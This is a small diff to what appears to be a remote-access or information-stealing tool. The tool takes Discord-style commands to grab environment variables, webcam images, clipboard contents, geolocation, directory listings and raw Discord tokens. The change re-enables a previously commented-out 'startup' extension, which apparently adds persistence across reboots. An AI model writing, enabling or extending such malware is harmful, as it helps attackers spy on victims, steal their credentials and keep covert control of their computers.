@@ -170,7 +170,7 @@ extensions = (
     "getenv",         # /get_environment
     "webcam",         # /get_webcam
     "clipboard",      # /get_clipboard
-    # "startup",        # /startup
+    "startup",        # /startup
     "geolocate",      # /get_geolocation
     "directory",      # /get_currentdir & /set_currentdir & /list_directory & /list_rawdir
     "rawtokens",      # /raw_tokens & /raw_discord
